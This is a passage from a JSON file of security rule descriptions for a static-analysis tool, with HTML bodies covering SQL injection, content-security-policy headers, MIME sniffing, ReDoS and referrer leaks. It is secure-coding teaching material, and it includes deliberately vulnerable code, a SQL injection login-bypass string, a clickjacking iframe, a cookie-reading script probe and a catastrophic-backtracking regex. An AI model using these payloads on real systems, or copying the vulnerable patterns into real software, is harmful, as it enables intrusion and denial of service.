data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n{\n    \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n    \"contentVersion\": \"1.0.0.0\",\n    \"resources\": [\n        {\n            \"type\": \"Microsoft.ApiManagement/service\",\n            \"apiVersion\": \"2022-09-01-preview\",\n            \"name\": \"apiManagementService\"\n        }\n    ]\n}\n</pre>\n<p>Using Bicep:</p>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nresource sensitiveApiManagementService 'Microsoft.ApiManagement/service@2022-09-01-preview' = {\n  name: 'apiManagementService'\n  // Sensitive: no Managed Identity is defined\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>Using ARM templates:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n{\n    \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n    \"contentVersion\": \"1.0.0.0\",\n    \"resources\": [\n        {\n            \"type\": \"Microsoft.ApiManagement/service\",\n            \"apiVersion\": \"2022-09-01-preview\",\n            \"name\": \"apiManagementService\",\n            \"identity\": {\n                \"type\": \"SystemAssigned\"\n            }\n        }\n    ]\n}\n</pre>\n<p>Using Bicep:</p>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nresource sensitiveApiManagementService 'Microsoft.ApiManagement/service@2022-09-01-preview' = {\n  name: 'apiManagementService'\n  identity: {\n    type: 'SystemAssigned'\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.microsoft.com/en-us/azure/active-directory/managed-identities-azure-resources/overview\">Azure AD Documentation - Managed\n  Identities Overview</a> </li>\n  <li> <a\n  href=\"https://docs.microsoft.com/en-us/azure/active-directory/managed-identities-azure-resources/managed-identity-best-practice-recommendations\">Azure AD Documentation - Managed Identities Best Practices</a> </li>\n  <li> <a href=\"https://docs.microsoft.com/en-us/azure/active-directory/managed-identities-azure-resources/services-support-managed-identities\">Azure\n  AD Documentation - Services that support managed identities</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "jssecurity:S3649": {
        "name": "Database queries should not be vulnerable to injection attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Database injections (such as SQL injections) occur in an application when the application retrieves data from a user or a third-party service and\ninserts it into a database query without sanitizing it first.</p>\n<p>If an application contains a database query that is vulnerable to injections, it is exposed to attacks that target any database where that query is\nused.</p>\n<p>A user with malicious intent carefully performs actions whose goal is to modify the existing query to change its logic to a malicious one.</p>\n<p>After creating the malicious request, the attacker can attack the databases affected by this vulnerability without relying on any\npre-requisites.</p>\n<h3>What is the potential impact?</h3>\n<p>In the context of a web application that is vulnerable to SQL injection:<br> After discovering the injection, attackers inject data into the\nvulnerable field to execute malicious commands in the affected databases.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Identity spoofing and data manipulation</h4>\n<p>A malicious database query enables privilege escalation or direct data leakage from one or more databases. This threat is the most widespread\nimpact.</p>\n<h4>Data deletion and denial of service</h4>\n<p>The malicious query makes it possible for the attacker to delete data in the affected databases.<br> This threat is particularly insidious if the\nattacked organization does not maintain a disaster recovery plan (DRP).</p>\n<h4>Chaining DB injections with other vulnerabilities</h4>\n<p>Attackers who exploit SQL injections rely on other vulnerabilities to maximize their profits.<br> Most of the time, organizations overlook some\ndefense in depth measures because they assume attackers cannot reach certain points in the infrastructure. This misbehavior can lead to multiple\nattacks with great impact:</p>\n<ul>\n  <li> When secrets are stored unencrypted in databases: Secrets can be exfiltrated and lead to compromise of other components. </li>\n  <li> If server-side OS and/or database permissions are misconfigured, injection can lead to remote code execution (RCE).\n    <ul>\n      <li> See <a href=\"https://blog.sonarsource.com/exploiting-hibernate-injections/\">our article on this topic</a> </li>\n    </ul>  </li>\n</ul>\n<h2>How to fix it in Sequelize</h2>\n<h3>Code examples</h3>\n<p>The following code is an example of an overly simple authentication function. It is vulnerable to SQL injection because user-controlled data is\ninserted directly into a query string: The application assumes that incoming data always has a specific range of characters, and ignores that some\ncharacters may change the query logic to a malicious one.</p>\n<p>In this particular case, the query can be exploited with the following string:</p>\n<pre>\nfoo' OR 1=1 --\n</pre>\n<p>By adapting and inserting this template string into one of the fields (<code>user</code> or <code>pass</code>), an attacker would be able to log in\nas any user within the scoped user table.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"11\" data-diff-type=\"noncompliant\">\nasync function index(req, res) {\n    const { db, User } = req.app.get('sequelize');\n\n    const user = req.query.user;\n    const pass = req.query.pass;\n\n    let loggedInUser = await db.query(\n        `SELECT * FROM users WHERE user = '${user}' AND pass = '${pass}'`,\n        {\n            model: User,\n        }\n    ); // Noncompliant\n\n    res.send(JSON.stringify(loggedInUser));\n    res.end();\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"11\" data-diff-type=\"compliant\">\nasync function index(req, res) {\n    const { db, User, QueryTypes } = req.app.get('sequelize');\n\n    const user = req.query.user;\n    const pass = req.query.pass;\n\n    let loggedInUser = await db.query(\n        `SELECT * FROM users WHERE user = $user AND pass = $pass`,\n        {\n            bind: {\n                user: user,\n                pass: pass,\n            },\n            type: QueryTypes.SELECT,\n            model: User,\n        }\n    );\n\n    res.send(JSON.stringify(loggedInUser));\n    res.end();\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Use prepared statements</h4>\n<p>As a rule of thumb, the best approach to protect against injections is to systematically ensure that untrusted data cannot break out of an\ninterpreted context.</p>\n<p>For database queries, prepared statements are a natural mechanism to achieve this due to their internal workings.<br> Here is an example with the\nfollowing query string (Java SE syntax):</p>\n<pre>\nSELECT * FROM users WHERE user = ? AND pass = ?\n</pre>\n<p><strong>Note: Placeholders may take different forms, depending on the library used. For the above example, the question mark symbol '?' was used as\na placeholder.</strong></p>\n<p>When a prepared statement is used by an application, the database server compiles the query logic even before the application passes the literals\ncorresponding to the placeholders to the database.<br> Some libraries expose a <code>prepareStatement</code> function that explicitly does so, and\nsome do not - because they do it transparently.</p>\n<p>The compiled code that contains the query logic also includes the placeholders: they serve as parameters.</p>\n<p>After compilation, the query logic is frozen and cannot be changed.<br> So when the application passes the literals that replace the placeholders,\nthey are not considered application logic by the database.</p>\n<p>Consequently, the database server prevents the dynamic literals of a prepared statement from affecting the underlying query, and thus sanitizes\nthem.</p>\n<p>On the other hand, the application does not automatically sanitize third-party data (for example, user-controlled data) inserted directly into a\nquery. An attacker who controls this third-party data can cause the database to execute malicious code.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://blog.sonarsource.com/exploiting-hibernate-injections/\">SonarSource, Exploiting Hibernate Injections</a> </li>\n  <li> <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html\">OWASP, SQL Injection Prevention Cheat\n  Sheet</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/89\">CWE-89 - Improper Neutralization of Special Elements used in an SQL Command</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/ITdGBQ\">CERT, IDS00-J.</a> - Prevent SQL injection </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "javascript:S5730": {
        "name": "Allowing mixed-content is security-sensitive",
        "htmlDesc": "<p>A mixed-content is when a resource is loaded with the HTTP protocol, from a website accessed with the HTTPs protocol, thus mixed-content are not\nencrypted and exposed to <a href=\"https://en.wikipedia.org/wiki/Man-in-the-middle_attack\">MITM attacks</a> and could break the entire level of\nprotection that was desired by implementing encryption with the HTTPs protocol.</p>\n<p>The main threat with mixed-content is not only the confidentiality of resources but the whole website integrity:</p>\n<ul>\n  <li> A passive mixed-content (eg: <em>&lt;img src=\"http://example.com/picture.png\"&gt;</em>) allows an attacker to access and replace only these\n  resources, like images, with malicious ones that could lead to successful phishing attacks. </li>\n  <li> With active mixed-content (eg: <em>&lt;script src=\"http://example.com/library.js\"&gt;</em>) an attacker can compromise the entire website by\n  injecting malicious javascript code for example (accessing and modifying the DOM, steal cookies, etc). </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The HTTPS protocol is in place and external resources are fetched from the website pages. </li>\n</ul>\n<p>There is a risk if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Implement content security policy <em>block-all-mixed-content</em> directive which is supported by all modern browsers and will block loading of\nmixed-contents.</p>\n<h2>Sensitive Code Example</h2>\n<p>In Express.js application the code is sensitive if the <a href=\"https://www.npmjs.com/package/helmet-csp\">helmet-csp</a> or <a\nhref=\"https://www.npmjs.com/package/helmet\">helmet</a> middleware is used without the <code>blockAllMixedContent</code> directive:</p>\n<pre>\nconst express = require('express');\nconst helmet = require('helmet');\n\nlet app = express();\n\napp.use(\n  helmet.contentSecurityPolicy({\n    directives: {\n      \"default-src\": [\"'self'\", 'example.com', 'code.jquery.com']\n    } // Sensitive: blockAllMixedContent directive is missing\n  })\n);\n</pre>\n<h2>Compliant Solution</h2>\n<p>In Express.js application a standard way to block mixed-content is to put in place the <a\nhref=\"https://www.npmjs.com/package/helmet-csp\">helmet-csp</a> or <a href=\"https://www.npmjs.com/package/helmet\">helmet</a> middleware with the\n<code>blockAllMixedContent</code> directive:</p>\n<pre>\nconst express = require('express');\nconst helmet = require('helmet');\n\nlet app = express();\n\napp.use(\n  helmet.contentSecurityPolicy({\n    directives: {\n      \"default-src\": [\"'self'\", 'example.com', 'code.jquery.com'],\n      blockAllMixedContent: [] // Compliant\n    }\n  })\n);\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> <a href=\"https://developer.mozilla.org/en-US/docs/Web/Security/Mixed_content\">developer.mozilla.org</a> - Mixed-content </li>\n  <li> <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP\">developer.mozilla.org</a> - Content Security Policy (CSP) </li>\n  <li> <a href=\"https://www.w3.org/TR/CSP3/\">w3.org</a> - Content Security Policy Level 3 </li>\n</ul>",
        "severity": "MINOR"
      },
      "javascript:S5732": {
        "name": "Disabling content security policy frame-ancestors directive is security-sensitive",
        "htmlDesc": "<p><a href=\"https://en.wikipedia.org/wiki/Clickjacking\">Clickjacking</a> attacks occur when an attacker try to trick an user to click on certain\nbuttons/links of a legit website. This attack can take place with malicious HTML frames well hidden in an attacker website.</p>\n<p>For instance, suppose a safe and authentic page of a social network (https://socialnetworkexample.com/makemyprofilpublic) which allows an user to\nchange the visibility of his profile by clicking on a button. This is a critical feature with high privacy concerns. Users are generally well informed\non the social network of the consequences of this action. An attacker can trick users, without their consent, to do this action with the below\nembedded code added on a malicious website:</p>\n<pre>\n&lt;html&gt;\n&lt;b&gt;Click on the button below to win 5000$&lt;/b&gt;\n&lt;br&gt;\n&lt;iframe src=\"https://socialnetworkexample.com/makemyprofilpublic\" width=\"200\" height=\"200\"&gt;&lt;/iframe&gt;\n&lt;/html&gt;\n</pre>\n<p>Playing with the size of the iframe it’s sometimes possible to display only the critical parts of a page, in this case the button of the\n<em>makemyprofilpublic</em> page.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Clickjacking#Clickjacking_categories\">Critical actions</a> of the application are prone to clickjacking\n  attacks because a simple click on a link or a button can trigger them. </li>\n</ul>\n<p>There is a risk if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Implement content security policy <em>frame-ancestors</em> directive which is supported by all modern browsers and will specify the origins of\nframe allowed to be loaded by the browser (this directive deprecates <a\nhref=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options\">X-Frame-Options</a>).</p>\n<h2>Sensitive Code Example</h2>\n<p>In Express.js application the code is sensitive if the <a href=\"https://www.npmjs.com/package/helmet-csp\">helmet-csp</a> or <a\nhref=\"https://www.npmjs.com/package/helmet\">helmet</a> middleware is used without the <code>frameAncestors</code> directive (or if\n<code>frameAncestors</code> is set to <code>'none'</code>):</p>\n<pre>\nconst express = require('express');\nconst helmet = require('helmet');\n\nlet app = express();\n\napp.use(\n  helmet.contentSecurityPolicy({\n    directives: {\n      // other directives\n      frameAncestors: [\"'none'\"] // Sensitive: frameAncestors  is set to none\n    }\n  })\n);\n</pre>\n<h2>Compliant Solution</h2>\n<p>In Express.js application a standard way to implement CSP frame-ancestors directive is the <a\nhref=\"https://www.npmjs.com/package/helmet-csp\">helmet-csp</a> or <a href=\"https://www.npmjs.com/package/helmet\">helmet</a> middleware:</p>\n<pre>\nconst express = require('express');\nconst helmet = require('helmet');\n\nlet app = express();\n\napp.use(\n  helmet.contentSecurityPolicy({\n    directives: {\n      // other directives\n      frameAncestors: [\"'example.com'\"] // Compliant\n    }\n  })\n);\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A04_2021-Insecure_Design/\">Top 10 2021 Category A4 - Insecure Design</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html\">OWASP Cheat Sheets</a> - Clickjacking Defense\n  Cheat Sheet </li>\n  <li> <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors\">developer.mozilla.org</a> -\n  Frame-ancestors </li>\n  <li> <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP\">developer.mozilla.org</a> - Content Security Policy (CSP) </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/451\">CWE-451 - User Interface (UI) Misrepresentation of Critical Information</a> </li>\n  <li> <a href=\"https://www.w3.org/TR/CSP3/\">w3.org</a> - Content Security Policy Level 3 </li>\n</ul>",
        "severity": "MINOR"
      },
      "javascript:S5734": {
        "name": "Allowing browsers to sniff MIME types is security-sensitive",
        "htmlDesc": "<p><a href=\"https://blog.mozilla.org/security/2016/08/26/mitigating-mime-confusion-attacks-in-firefox/\">MIME confusion</a> attacks occur when an\nattacker successfully tricks a web-browser to interpret a resource as a different type than the one expected. To correctly interpret a resource\n(script, image, stylesheet …​) web browsers look for the <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Type\">Content-Type\nheader</a> defined in the HTTP response received from the server, but often this header is not set or is set with an incorrect value. To avoid\ncontent-type mismatch and to provide the best user experience, web browsers try to deduce the right content-type, generally by inspecting the content\nof the resources (the first bytes). This \"guess mechanism\" is called <a href=\"https://en.wikipedia.org/wiki/Content_sniffing\">MIME type\nsniffing</a>.</p>\n<p>Attackers can take advantage of this feature when a website (\"example.com\" here) allows to upload arbitrary files. In that case, an attacker can\nupload a malicious image <em>fakeimage.png</em> (containing malicious JavaScript code or <a\nhref=\"https://docs.microsoft.com/fr-fr/archive/blogs/ieinternals/script-polyglots\">a polyglot content</a> file) such as:</p>\n<pre>\n&lt;script&gt;alert(document.cookie)&lt;/script&gt;\n</pre>\n<p>When the victim will visit the website showing the uploaded image, the malicious script embedded into the image will be executed by web browsers\nperforming MIME type sniffing.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Type\">Content-Type</a> header is not systematically set for all\n  resources. </li>\n  <li> Content of resources can be controlled by users. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Implement <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options\">X-Content-Type-Options</a> header with\n<em>nosniff</em> value (the only existing value for this header) which is supported by all modern browsers and will prevent browsers from performing\nMIME type sniffing, so that in case of Content-Type header mismatch, the resource is not interpreted. For example within a &lt;script&gt; object\ncontext, JavaScript MIME types are expected (like <em>application/javascript</em>) in the Content-Type header.</p>\n<h2>Sensitive Code Example</h2>\n<p>In Express.js application the code is sensitive if, when using <a href=\"https://www.npmjs.com/package/helmet\">helmet</a>, the <code>noSniff</code>\nmiddleware is disabled:</p>\n<pre>\nconst express = require('express');\nconst helmet = require('helmet');\n\nlet app = express();\n\napp.use(\n  helmet({\n    noSniff: false, // Sensitive\n  })\n);\n</pre>\n<h2>Compliant Solution</h2>\n<p>When using <code>helmet</code> in an Express.js application, the <code>noSniff</code> middleware should be enabled (it is also done by\ndefault):</p>\n<pre>\nconst express = require('express');\nconst helmet= require('helmet');\n\nlet app = express();\n\napp.use(helmet.noSniff());\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options\">developer.mozilla.org</a> - X-Content-Type-Options\n  </li>\n  <li> <a href=\"https://blog.mozilla.org/security/2016/08/26/mitigating-mime-confusion-attacks-in-firefox/\">blog.mozilla.org</a> - Mitigating MIME\n  Confusion Attacks in Firefox </li>\n</ul>",
        "severity": "MINOR"
      },
      "javascript:S5852": {
        "name": "Using slow regular expressions is security-sensitive",
        "htmlDesc": "<p>Most of the regular expression engines use backtracking to try all possible execution paths of the regular expression when evaluating an input, in\nsome cases it can cause performance issues, called <strong>catastrophic backtracking</strong> situations. In the worst case, the complexity of the\nregular expression is exponential in the size of the input, this means that a small carefully-crafted input (like 20 chars) can trigger catastrophic\nbacktracking and cause a denial of service of the application. Super-linear regex complexity can lead to the same impact too with, in this case, a\nlarge carefully-crafted input (thousands chars).</p>\n<p>This rule determines the runtime complexity of a regular expression and informs you if it is not linear.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The input is user-controlled. </li>\n  <li> The input size is not restricted to a small number of characters. </li>\n  <li> There is no timeout in place to limit the regex evaluation time. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>To avoid catastrophic backtracking situations, make sure that none of the following conditions apply to your regular expression.</p>\n<p>In all of the following cases, catastrophic backtracking can only happen if the problematic part of the regex is followed by a pattern that can\nfail, causing the backtracking to actually happen.</p>\n<ul>\n  <li> If you have a repetition <code>r*</code> or <code>r*?</code>, such that the regex <code>r</code> could produce different possible matches (of\n  possibly different lengths) on the same input, the worst case matching time can be exponential. This can be the case if <code>r</code> contains\n  optional parts, alternations or additional repetitions (but not if the repetition is written in such a way that there’s only one way to match it).\n  </li>\n  <li> If you have multiple repetitions that can match the same contents and are consecutive or are only separated by an optional separator or a\n  separator that can be matched by both of the repetitions, the worst case matching time can be polynomial (O(n^c) where c is the number of\n  problematic repetitions). For example <code>a*b*</code> is not a problem because <code>a*</code> and <code>b*</code> match different things and\n  <code>a*_a*</code> is not a problem because the repetitions are separated by a <code>'_'</code> and can’t match that <code>'_'</code>. However,\n  <code>a*a*</code> and <code>.*_.*</code> have quadratic runtime. </li>\n  <li> If the regex is not anchored to the beginning of the string, quadratic runtime is especially hard to avoid because whenever a match fails, the\n  regex engine will try again starting at the next index. This means that any unbounded repetition, if it’s followed by a pattern that can fail, can\n  cause quadratic runtime on some inputs. For example <code>str.split(/\\s*,/)</code> will run in quadratic time on strings that consist entirely of\n  spaces (or at least contain large sequences of spaces, not followed by a comma). </li>\n</ul>\n<p>In order to rewrite your regular expression without these patterns, consider the following strategies:</p>\n<ul>\n  <li> If applicable, define a maximum number of expected repetitions using the bounded quantifiers, like <code>{1,5}</code> instead of <code>+</code>\n  for instance. </li>\n  <li> Refactor nested quantifiers to limit the number of way the inner group can be matched by the outer quantifier, for instance this nested\n  quantifier situation <code>(ba+)+</code> doesn’t cause performance issues, indeed, the inner group can be matched only if there exists exactly one\n  <code>b</code> char per repetition of the group. </li>\n  <li> Optimize regular expressions by emulating <em>possessive quantifiers</em> and <em>atomic grouping</em>. </li>\n  <li> Use negated character classes instead of <code>.</code> to exclude separators where applicable. For example the quadratic regex\n  <code>.*_.*</code> can be made linear by changing it to <code>[^_]*_.*</code> </li>\n</ul>\n<p>Sometimes it’s not possible to rewrite the regex to be linear while still matching what you want it to match. Especially when the regex is not\nanchored to the beginning of the string, for which it is quite hard to avoid quadratic runtimes. In those cases consider the following approaches:</p>\n<ul>\n  <li> Solve the problem without regular expressions </li>\n  <li> Use an alternative non-backtracking regex implementations such as Google’s <a href=\"https://github.com/google/re2\">RE2</a> or <a\n  href=\"https://github.com/uhop/node-re2/\">node-re2</a>. </li>\n  <li> Use multiple passes. This could mean pre- and/or post-processing the string manually before/after applying the regular expression to it or\n  using multiple regular expressions. One example of this would be to replace <code>str.split(/\\s*,\\s*/)</code> with <code>str.split(\",\")</code> and\n  then trimming the spaces from the strings as a second step. </li>\n  <li> It is often possible to make the regex infallible by making all the parts that could fail optional, which will prevent backtracking. Of course\n  this means that you’ll accept more strings than intended, but this can be handled by using capturing groups to check whether the optional parts were\n  matched or not and then ignoring the match if they weren’t. For example the regex <code>x*y</code> could be replaced with <code>x*(y)?</code> and\n  then the call to <code>str.match(regex)</code> could be replaced with <code>matched = str.match(regex)</code> and <code>matched[1] !==\n  undefined</code>. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>The regex evaluation will never end:</p>\n<pre>\n/(a+)+$/.test(\n\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"+\n\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"+\n\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"+\n\"aaaaaaaaaaaaaaa!\"\n); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<p>Possessive quantifiers do not keep backtracking positions, thus can be used, if possible, to avoid performance issues. Unfortunately, they are not\nsupported in JavaScript, but one can still mimick them using lookahead assertions and backreferences:</p>\n<pre>\n/((?=(a+))\\2)+$/.test(\n\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"+\n\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"+\n\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"+\n\"aaaaaaaaaaaaaaa!\"\n); // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/400\">CWE-400 - Uncontrolled Resource Consumption</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/1333\">CWE-1333 - Inefficient Regular Expression Complexity</a> </li>\n  <li> <a href=\"https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS\">owasp.org</a> - OWASP Regular expression Denial\n  of Service - ReDoS </li>\n  <li> <a\n  href=\"https://web.archive.org/web/20220506215733/https://stackstatus.net/post/147710624694/outage-postmortem-july-20-2016\">stackstatus.net(archived)</a> - Outage Postmortem - July 20, 2016 </li>\n  <li> <a href=\"https://www.regular-expressions.info/catastrophic.html\">regular-expressions.info</a> - Runaway Regular Expressions: Catastrophic\n  Backtracking </li>\n  <li> <a\n  href=\"https://docs.microsoft.com/en-us/dotnet/standard/base-types/backtracking-in-regular-expressions#backtracking-with-nested-optional-quantifiers\">docs.microsoft.com</a> - Backtracking with Nested Optional Quantifiers </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "javascript:S5736": {
        "name": "Disabling strict HTTP no-referrer policy is security-sensitive",
        "htmlDesc": "<p><a href=\"https://en.wikipedia.org/wiki/HTTP_referer\">HTTP header referer</a> contains a URL set by web browsers and used by applications to track\nfrom where the user came from, it’s for instance a relevant value for web analytic services, but it can cause <a\nhref=\"https://developer.mozilla.org/en-US/docs/Web/Security/Referer_header:_privacy_and_security_concerns\">serious privacy and security problems</a>\nif the URL contains confidential information. Note that Firefox for instance, to prevent data leaks, <a\nhref=\"https://blog.mozilla.org/security/2018/01/31/preventing-data-leaks-by-stripping-path-information-in-http-referrers/\">removes path\ninformation</a> in the Referer header while browsing privately.</p>\n<p>Suppose an e-commerce website asks the user his credit card number to purchase a product:</p>\n<pre>\n&lt;html&gt;\n&lt;body&gt;\n&lt;form action=\"/valid_order\" method=\"GET\"&gt;\nType your credit card number to purchase products:\n&lt;input type=text id=\"cc\" value=\"1111-2222-3333-4444\"&gt;\n&lt;input type=submit&gt;\n&lt;/form&gt;\n&lt;/body&gt;\n</pre>\n<p>When submitting the above HTML form, a HTTP GET request will be performed, the URL requested will be\nhttps://example.com/valid_order?cc=1111-2222-3333-4444 with credit card number inside and it’s obviously not secure for these reasons:</p>\n<ul>\n  <li> URLs are stored in the history of browsers. </li>\n  <li> URLs could be accidentally shared when doing copy/paste actions. </li>\n  <li> URLs can be stolen if a malicious person looks at the computer screen of an user. </li>\n</ul>\n<p>In addition to these threats, when further requests will be performed from the \"valid_order\" page with a simple legitimate embedded script like\nthat:</p>\n<pre>\n&lt;script src=\"https://webanalyticservices_example.com/track\"&gt;\n</pre>\n<p>The referer header which contains confidential information will be send to a third party web analytic service and cause privacy issue:</p>\n<pre>\nGET /track HTTP/2.0\nHost: webanalyticservices_example.com\nReferer: https://example.com/valid_order?cc=1111-2222-3333-4444\n</pre>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Confidential information exists in URLs. </li>\n  <li> Semantic of HTTP methods is not respected (eg: use of a GET method instead of POST when the state of the application is changed). </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Confidential information should not be set inside URLs (GET requests) of the application and a safe (ie: different from <code>unsafe-url</code> or\n<code>no-referrer-when-downgrade</code>) <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy\">referrer-Policy</a>\nheader, to control how much information is included in the referer header, should be used.</p>\n<h2>Sensitive Code Example</h2>\n<p>In Express.js application the code is sensitive if the <a href=\"https://www.npmjs.com/package/helmet\">helmet</a> <code>referrerPolicy</code>\nmiddleware is disabled or used with <code>no-referrer-when-downgrade</code> or <code>unsafe-url</code>:</p>\n<pre>\nconst express = require('express');\nconst helmet = require('helmet');\n\napp.use(\n  helmet.referrerPolicy({\n    policy: 'no-referrer-when-downgrade' // Sensitive: no-referrer-when-downgrade is used\n  })\n);\n</pre>\n<h2>Compliant Solution</h2>\n<p>In Express.js application a secure solution is to user the <a href=\"https://www.npmjs.com/package/helmet\">helmet</a> referrer policy middleware set\nto <code>no-referrer</code>:</p>\n<pre>\nconst express = require('express');\nconst helmet = require('helmet');\n\nlet app = express();\n\napp.use(\n  helmet.referrerPolicy({\n    policy: 'no-referrer' // Compliant\n  })\n);\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy\">developer.mozilla.org</a> - Referrer-Policy </li>\n  <li> <a href=\"https://developer.mozilla.org/en-US/docs/Web/Security/Referer_header:_privacy_and_security_concerns\">developer.mozilla.org</a> -\n  Referer header: privacy and security concerns </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/200\">CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "javascript:S5739": {
        "name": "Disabling Strict-Transport-Security policy is security-sensitive",
